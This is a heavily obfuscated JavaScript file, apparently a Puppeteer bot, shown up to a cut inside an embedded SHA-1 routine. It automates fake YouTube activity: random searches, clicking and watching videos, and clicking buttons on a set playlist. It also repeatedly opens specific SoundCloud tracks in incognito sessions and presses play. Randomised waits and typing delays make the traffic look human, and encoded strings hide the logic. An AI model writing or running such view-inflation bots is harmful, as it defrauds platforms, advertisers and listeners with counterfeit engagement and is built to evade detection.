function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xeb + 0x1dc5 + -0x1eb0);
    let h = e[f];
    if (c['hfHgRB'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x141f * 0x1 + -0xa2 + -0x137d, r, s, t = 0xb3 * 0x28 + 0x1e * -0x1 + -0x1bda; s = m['charAt'](t++); ~s && (r = q % (-0x3 * 0xaa3 + 0x203b + -0x4e) ? r * (-0x1fc3 + -0x27b * 0x3 + 0x2774) + s : s, q++ % (0x2b6 * 0x4 + -0x13ba + -0x86 * -0x11)) ? o += String['fromCharCode'](0x293 + -0x23b * 0xd + -0x1 * -0x1b6b & r >> (-(-0x4 * 0x70b + -0x1 * 0x2202 + -0x18e * -0x28) * q & 0x3bb * 0x7 + -0x1782 + -0x1 * 0x295)) : -0x1f2 + -0x134e + 0x1540) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1307 * 0x1 + -0x48b + -0xe7c, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1190 + 0x1 * 0xf7 + -0x10a9 * -0x1))['slice'](-(0x2 * -0x802 + 0xf83 + 0x83));
        }
        return decodeURIComponent(p);
      };
      c['uOKmrF'] = i, b = arguments, c['hfHgRB'] = !![];
    }
    const j = e[-0x1 * 0x1877 + 0x440 + 0x1437],
      k = f + j,
      l = b[k];
    return !l ? (h = c['uOKmrF'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const W = c,
  V = d,
  U = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x3 * 0xaa3 + 0x203b + -0x51))) + i;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xeb + 0x1dc5 + -0x1eb0);
    let h = e[f];
    if (b['hhZOzB'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x141f * 0x1 + -0xa2 + -0x137d, s, t, u = 0xb3 * 0x28 + 0x1e * -0x1 + -0x1bda; t = n['charAt'](u++); ~t && (s = r % (-0x3 * 0xaa3 + 0x203b + -0x4e) ? s * (-0x1fc3 + -0x27b * 0x3 + 0x2774) + t : t, r++ % (0x2b6 * 0x4 + -0x13ba + -0x86 * -0x11)) ? p += String['fromCharCode'](0x293 + -0x23b * 0xd + -0x1 * -0x1b6b & s >> (-(-0x4 * 0x70b + -0x1 * 0x2202 + -0x18e * -0x28) * r & 0x3bb * 0x7 + -0x1782 + -0x1 * 0x295)) : -0x1f2 + -0x134e + 0x1540) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1307 * 0x1 + -0x48b + -0xe7c, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1190 + 0x1 * 0xf7 + -0x10a9 * -0x1))['slice'](-(0x2 * -0x802 + 0xf83 + 0x83));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1 * 0x1877 + 0x440 + 0x1437,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x18ca + -0xe5 + -0x7f7 * 0x3; u < 0x507 + 0x22db + -0x26e2; u++) {
          p[u] = u;
        }
        for (u = 0x137f + 0x1 * 0x1785 + -0xac1 * 0x4; u < -0x1fa4 * -0x1 + 0x5fe + 0x6 * -0x61b; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x174 + -0x1159 + 0x10e5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1e31 + -0x95b * -0x1 + -0x278c, q = 0x1904 + -0x267 * 0x1 + -0x169d;
        for (let v = 0x4 * 0x63b + 0x9 * -0x33e + 0x442; v < n['length']; v++) {
          u = (u + (-0x95d + -0x729 + 0x1 * 0x1087)) % (-0xa4e * 0x3 + -0x1842 + 0x382c), q = (q + p[u]) % (0x91 * -0x9 + -0xd * -0x231 + -0x1 * 0x1664), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2345 + -0x79e + -0x1 * 0x1aa7)]);
        }
        return t;
      };
      b['TVvfOy'] = m, c = arguments, b['hhZOzB'] = !![];
    }
    const j = e[0x2 * -0x1039 + 0x1 * -0x3ce + 0x2440],
      k = f + j,
      l = c[k];
    return !l ? (b['MgXQgk'] === undefined && (b['MgXQgk'] = !![]), h = b['TVvfOy'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1fc3 + -0x27b * 0x3 + 0x2734), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x4111 * 0x1 + -0x7659 + -0x110c * -0xa + (0x7ba + -0xc6d * 0x7 + -0x1 * -0x89d9) * random()) : await standardWaitForNetIdle(f), await wait(-0x4 * 0x70b + -0x1 * 0x2202 + -0x28db * -0x2 + (0x1cd * 0x1d + -0x2f04 + -0x1b * -0x141) * random()), -0x1f2 + -0x134e + 0x1541;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x1307 * 0x1 + -0x48b + 0x50c), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1190 + 0x1 * 0xf7 + -0x109a * -0x1;
}
async function randomWait() {
  return await wait(0x2 * -0x802 + 0xf83 + 0x1409 + (-0x1 * 0x1877 + 0x440 + 0x27bf) * random()), 0x18ca + -0xe5 + -0x8b * 0x2c;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x507 + 0x22db + -0x27e2, 0x137f + 0x1 * 0x1785 + -0x9b * 0x47), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x17ba9 * -0x1 + 0x47e8 + 0x2f * -0x49f) * getRandomInt(0x174 + -0x1159 + 0xfe7, 0x1e31 + -0x95b * -0x1 + -0x2787), h)), 0x1904 + -0x267 * 0x1 + -0x169c;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = d,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + R(0x10) + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x4 * 0x63b + 0x9 * -0x33e + 0x442;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x95d + -0x729 + 0x1 * 0x1087]['split']('\x20');
    for (let k = -0xa4e * 0x3 + -0x1842 + 0x372c; k < i['length']; k += 0x91 * -0x9 + -0xd * -0x231 + -0x1 * 0x1762)
      j += i[k] * h[i[k + (0x2345 + -0x79e + -0x1 * 0x1ba6)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x2 * -0x1039 + 0x1 * -0x3ce + 0x2446)['map'](l => Array['from'](l['children']))['flat'](-0x551 + 0x1af2 + -0x15a0)['map'](l => l['childNodes'][-0x2ea * 0x6 + -0x2f * -0x13 + 0xe00]['childNodes'][0x23d1 + -0x12da + -0x10f7]['childNodes'][-0x31 * 0x5e + 0x30d * -0x5 + -0x260 * -0xe]['childNodes'][-0x1 * -0x15cb + 0x7 * -0x1be + -0x3f * 0x27]['childNodes'][0x131f * -0x2 + -0x173d + 0x3d7c]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j[S(0xd)](l => l['href']);
  }), await wait(getRandomInt(0x43 * -0x8b + 0xcab + -0xe * -0x1f9, -0x175 * 0x5 + 0x1c1f * -0x1 + 0x125 * 0x30)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x9 * 0x4c + -0x2 * -0x3a67 + -0x378a);
  const h = await getMaxTime(f),
    i = Math['min']((-0x9482 + -0x1 * -0x1cdb2 + 0x34 * -0x184) * getRandomInt(0x1129 * -0x1 + -0x37d * 0x8 + 0x419 * 0xb, 0x1d88 + 0x6 * 0xa1 + -0x2149), h);
  return await wait(i), -0x61d * 0x2 + -0x1259 + 0x1e94;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x246e + -0xd80 + 0x496 * -0x5]['children'][0x1 * -0x1c3d + 0x1 * 0x679 + 0x15c4 * 0x1]['children'][-0x790 * -0x3 + -0x16a + 0x1 * -0x1546]['children'][-0x97 * -0x35 + -0x4 * -0x559 + -0x34a7]['children'][0x13b0 + 0x3 * 0xbdc + -0x3744]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x3 * 0xcb5 + -0x76e + 0x7ac * -0x4;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x27 * -0x37 + -0xa79 + 0x27c + (-0x215 * 0x7 + -0x1 * -0x526 + 0x3 * 0x335) * random()
  }), await wait(0x22d3 + -0x62c * -0x6 + 0x174d * -0x3 + (0x4e0 + -0x6 * 0x245 + 0x4f5 * 0x2) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xf + 0x9ae + -0x9bb]['childNodes'][-0x1b12 + -0x11 * -0x217 + 0x43a * -0x2]['childNodes'][-0x245 * 0x7 + -0x5 * -0x191 + 0x80f]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1a66 * -0x1 + -0x1524 + -0x2f8f * -0x1]['childNodes'][-0xd2f + -0xb89 * -0x1 + -0x1 * -0x1a6]['childNodes'][-0x1a41 + -0xa9 * 0x9 + 0x2034]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x24b * 0xe + -0x6 * -0x7d + 0x93 * -0x3d),
          r = 0x795 + -0xe3 * 0x27 + 0x10 * 0x1b0;
        for (let u = -0x2 * 0x137a + 0x260d + 0xe7; u < q['length']; u += 0x1 * -0x1dc5 + 0x38 * -0x5d + -0x263 * -0x15)
          r += q[u] * k[q[u + (0x515 + 0x315 * 0x2 + -0xb3e)]];
        return r;
      }(n);
  });
  await wait((-0x54b4 + -0x1 * -0x517d + 0x3dcf) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x8532 + -0x18f06 + 0x378 * 0xdd) * getRandomInt(-0x19c8 + -0x58 + 0x1 * 0x1a21, 0x878 * 0x4 + -0x2c * 0x60 + -0x1156), h + (-0x1e6c + -0x1dce + 0x4fc2));
  return await wait(i), 0x2d * 0x9a + 0x35f + 0x1e70 * -0x1;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x16 * 0x119 + 0x15d6 * -0x1 + -0x25 * 0x10), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xb9f + 0x8cb + 0x6 * -0x173 + (-0x1585 + 0x59 * 0x34 + 0x1 * 0x759) * Math['random']());
    });
  }, 0x167a + 0x191 * -0xc + 0xbd5 * 0x2);
  await wait(0x73631 + -0x9 * -0xf1ca + -0xb226b);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xf59 * 0xb + -0x2 * 0xb54b + -0x1 * -0x2fdc9) * getRandomInt(-0x8b4 + 0x9a9 + 0xf1 * -0x1, 0x152d + -0x908 + -0xc0c)), clearInterval(h), 0x4ea + -0xd79 * -0x1 + 0x2 * -0x931;
}

function a() {
  const bl = [
    'sm5MLz_IrQ',
    'close',
    'l8oTWPVcMmkJW7DYW4K4Fa',
    'ike\x20Gecko)',
    'AgvHzgvYCW',
    'https://ww',
    'vmoaW4zuWRJcGCoYWRZdKw0',
    'WOjFW4zArmkUWRT0cGi',
    'mgnPC1PRExDOzW',
    'l2xdQ1mxWOZdQSk7WPDv',
    'userAction',
    'utobreak-f',
    '0e3GPea1Ty',
    'BwfW',
    'nffcntLLDgOWsq',
    'BNv4ihG4nL82na',
    'sByClassNa',
    'https://me',
    'mjVwfjJ2nj',
    'i8obW7DFW6PyWRDxWO0d',
    'ugTrCfyTrNDOCW',
    'WPvUW5bA',
    'uKjtsefingLxvq',
    'BgXmAxn0zw5izq'
  ];
  a = function() {
    return bl;
  };
  return a();
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x778 + -0x2413 + 0x1c9b;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1ede + -0x1305 * -0x1 + -0x1 * -0xbda;
    await randomWait();
  }
  return 0x16 * -0x162 + -0x251 + 0x20be;
}

function fetchRandomSC() {
  return Math['random']() <= -0x5ed * 0x1 + 0x7dc * -0x2 + 0x15a5 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1 * -0x12c5 + 0x182b + 0x566 * -0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xdb9 + 0xfc0 + 0x3 * -0x9d3 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1 * -0x9ea + -0x1689 + -0x167 * -0x9;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const T = c;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + T(0x17) + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xe132 + -0x239 * -0x4f + -0x3 * -0x4b21 + getRandomInt(0x35b5 + -0x1b * 0xa6 + 0x1665, 0x888b + 0x71e6 + -0x8541));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x11f * -0x19 + -0x527 * -0x7 + -0x9 * 0x71f), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0xb + 0x2129 + -0x14 * 0x1a9;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x16df * 0x1 + -0x1f0e + 0x37 * 0xfb, 0x4ca * -0x3 + -0xd77 * -0x1 + 0x119)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * 0x25a + 0xacb + -0x555 + floor((-0x21c2 + -0x1f9d + 0x4547) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xb48b369e + 0x3e0d * -0x3416a + -0x41e0ac0 * -0x7c),
          0x9ef8f * -0x1 + -0x173f26 * 0x4 + 0xe6ec27,
          -0x1 * 0x155 + 0x320c + 0x4f49 * 0x1,
          0x8c8 * -0x2 + -0x19bd * -0x1 + -0x83 * 0xf
        ], y = [
          -0x2 * -0xfe2 + -0x4c5 + -0x1ae7,
          0x12cd * -0x1 + -0x41b + 0x16f8,
          -0x941 + -0x1749 + -0x2 * -0x1049,
          -0x20b0 + 0x2 * 0xaf1 + 0xace
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1284 + -0x64a + 0x18cf)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x6a * 0x33 + -0xc32 + -0x8ec; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x2207 + 0x1196 + 0x1071) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1c06 + 0x66a + -0x2270] = A[-0x24e + -0x1 * -0x5c1 + 0x363 * -0x1] = A[0x39 * 0x71 + 0x74b * 0x5 + -0xc53 * 0x5] = A[-0xb5b + 0x21f7 + -0x169a] = A[0x3 * -0x5c1 + 0x269d + -0x9 * 0x25f] = A[0x1261 + 0x13ed + -0x1d * 0x152] = A[0x46 * 0x2 + -0x152e * 0x1 + 0x14a7] = A[0x78c + 0x72 * -0x41 + 0x156c] = A[0x550 * 0x5 + -0xaec + -0x1 * 0xf9d] = A[-0xad6 * -0x1 + -0xb48 + 0x7a] = A[0x1f * -0x117 + 0x12e3 + 0xeef * 0x1] = A[-0x25d3 * 0x1 + 0x2243 + 0x39a * 0x1] = A[0x438 + 0x1fae * -0x1 + 0x1b81] = A[0x930 + 0x3a9 * 0x4 + 0xbe4 * -0x2] = A[0x2 * -0xa68 + -0x1183 + 0x998 * 0x4] = A[0x1d5f * -0x1 + -0x155 * 0x14 + -0x1cf * -0x1f] = A[0xa33 + -0x218d + 0x1769] = 0x18bd + 0x1 * -0x1d31 + 0x474, this['blocks'] = A) : this['blocks'] = [
                0xd51 + -0x14 * -0x95 + -0x18f5,
                0x21 * -0x10d + 0x2cd * -0x9 + 0x3be2,
                -0x25dc + -0x1fd0 + -0x2ae * -0x1a,
                0xbf * 0x29 + -0x100d * -0x1 + -0x2ea4,
                -0x1a55 + -0x16c1 + -0x7a * -0x67,
                -0x24cc + 0x2062 + -0x46a * -0x1,
                -0x10 * 0x213 + 0x2b * -0xd5 + 0x217 * 0x21,
                -0x1f7e + -0x1 * -0xff3 + 0x17 * 0xad,
                0x2 * 0xa4d + -0x599 * -0x1 + 0x13 * -0x161,
                0x1fff * -0x1 + -0x1fa7 + 0x3fa6,
                -0x1f4c + 0x4 * 0x2e2 + 0x37 * 0x5c,
                0x2 * 0x20b + 0x299 + -0x6af,
                -0xc38 + -0x2 * 0x47f + 0x1e * 0xb5,
                -0x3a9 + 0x239e * -0x1 + -0x2747 * -0x1,
                0x1618 + -0xc14 + -0xa04,
                -0x5 * 0x4ef + -0x1 * -0x14bd + 0x3ee,
                0x52d * 0x1 + -0x97c * -0x4 + -0x2b1d
              ], this['h0'] = 0x8562317b + 0x1427e * 0x8b27 + -0x66b44cd6 * 0x2, this['h1'] = 0xa3f1eb42 + -0x1971a6499 + 0x1e2f624e0, this['h2'] = -0x822eccd * 0x9 + -0x4 * 0x1e7b4219 + 0x15be23897, this['h3'] = 0x1ea0ff09 + -0x191 * -0xccb83 + -0x227972c6, this['h4'] = 0x22f9aba * 0x21 + 0x645243ef + 0x175dac07, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x25b0 + -0x7 * -0xb5 + 0x20bd, this['finalized'] = this['hashed'] = 0x2561 + 0x1470 + 0x30b * -0x13, this['first'] = 0x1345 + 0x1a5c + 0x8 * -0x5b4;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x7 * -0x221 + -0xbff + -0x2e8, O = J['length'] || -0x1cb3 + 0x117 * 0x15 + 0x5d0, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x11fe + -0x1797 + 0x2995, P[0x1767 * 0x1 + -0x318 * -0xa + -0x3657] = this['block'], P[0x41 * 0x17 + -0x2 * 0xeb1 + 0x179b] = P[0xd38 + 0x1 * -0x19ab + 0xc74 * 0x1] = P[0x1 * -0x14fd + -0xb24 + 0x2023] = P[0x135a * 0x2 + -0x13a5 + -0x130c] = P[-0xde5 * 0x1 + -0x1 * -0x2507 + 0x10d * -0x16] = P[-0x1b06 + -0x1729 + 0x396 * 0xe] = P[-0x206 * -0x13 + -0xe27 * -0x2 + 0x75 * -0x92] = P[-0x1d29 + -0x19ca + 0x1 * 0x36fa] = P[0x61 * 0x5f + -0x236c + -0x8b] = P[0xe55 + 0x669 + -0x14b5] = P[0x2284 + -0x7 * -0x239 + -0x3209] = P[-0x1 * -0xd88 + -0x21d4 + 0x1457] = P[0x19ca + 0xf * 0x1d3 + -0x5 * 0xa9f] = P[-0x21e * -0x1 + 0x4 * -0x3c4 + -0x1 * -0xcff] = P[0x24cd * 0x1 + -0x211c + 0x31 * -0x13] = P[0x481 * 0x4 + 0x8 * 0x206 + -0x2225 * 0x1] = 0x18f7 + 0xe2d * -0x1 + 0xaca * -0x1), K) {
                    for (N = this['start']; M < O && N < -0x1 * 0x90c + 0x3 * 0x4da + -0x542; ++M)
                      P[N >> 0x2229 + -0x806 * 0x3 + 0x1 * -0xa15] |= J[M] << y[0xe56 * 0x1 + 0x2 * 0x9aa + -0x21a7 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1 * -0x9c2 + 0x2431 + -0x1a2f; ++M)
                      (L = J['charCodeAt'](M)) < 0x2 * 0x78e + -0xf1e + 0x5 * 0x1a ? P[N >> 0x4c * -0x1a + 0x2 * -0x106b + 0x2890] |= L << y[-0x22d8 + -0x3 * 0xbcb + 0x463c & N++] : L < -0x1769 + 0x18a7 + 0xad * 0xa ? (P[N >> -0x26b + -0x9dd + 0xf2 * 0xd] |= (0x52 * -0x6f + 0xe74 + -0xaed * -0x2 | L >> 0x3 * -0xc4f + 0x8fd * 0x1 + 0x1bf6) << y[0x7b7 + 0x23d * 0xc + 0x7 * -0x4f0 & N++], P[N >> -0x3 * -0x13d + 0x3b + 0x2a * -0x18] |= (-0x227d + 0x2205 + 0xf8 | 0x1 * -0x23b1 + -0xa1 * -0x1f + 0x1071 & L) << y[0x1b40 + -0x3 * 0x9b9 + 0x1ee & N++]) : L < -0x1 * -0x1410d + -0x6a89 * 0x3 + -0x1 * -0xd68e || L >= 0x1272d + -0xf260 + 0xab33 ? (P[N >> 0xe52 + 0x22d3 * 0x1 + -0x3123] |= (-0x18ac + -0x14a5 + 0xd7 * 0x37 | L >> -0xd * -0x23d + -0x129f + -0xa6e) << y[0x1e22 + -0x1e67 * 0x1 + -0xc * -0x6 & N++], P[N >> 0x12be * -0x2 + 0x249a + -0x1 * -0xe4] |= (-0x1530 + -0x139d + 0x294d | L >> 0x14 * 0x187 + -0x1 * -0xc9f + -0x2b25 & 0x20ef + -0x1 * -0xcfc + -0x2dac * 0x1) << y[0x3 * -0x6d9 + -0x2 * 0x179 + -0x2 * -0xbc0 & N++], P[N >> 0xa * 0x258 + -0x1141 + -0x62d] |= (-0x1c19 + -0x16d0 + 0x3369 | -0x23d6 + 0x5 * 0x5f1 + 0x20 * 0x33 & L) << y[0x1eb6 + 0x1 * 0xbdd + -0x2 * 0x1548 & N++]) : (L = 0x1df7 * 0x3 + -0x17471 + 0x4 * 0x86a3 + ((0xf70 + 0x1 * 0x141b + -0x1f8c & L) << -0x9f + -0x1c09 * -0x1 + 0xdb0 * -0x2 | -0x1c8f + 0xcb7 + 0x13d7 & J['charCodeAt'](++M)), P[N >> -0xb75 + -0x68 + 0xbdf] |= (-0x1d * -0xb9 + -0x1 * 0x231c + 0xf17 | L >> -0x5ef + 0x757 * 0x1 + -0x156) << y[0x22b9 + 0x1b0 + -0x2466 & N++], P[N >> 0xd1 * -0x12 + 0x3b * -0x47 + 0x1f11] |= (0x1277 + 0x1 * -0x49 + -0x2 * 0x8d7 | L >> 0xb77 + -0xb56 * -0x3 + 0x191 * -0x1d & -0xb * 0x21f + 0x2512 + 0x6bf * -0x2) << y[0xaf7 * 0x3 + 0x1722 + -0x1e * 0x1de & N++], P[N >> 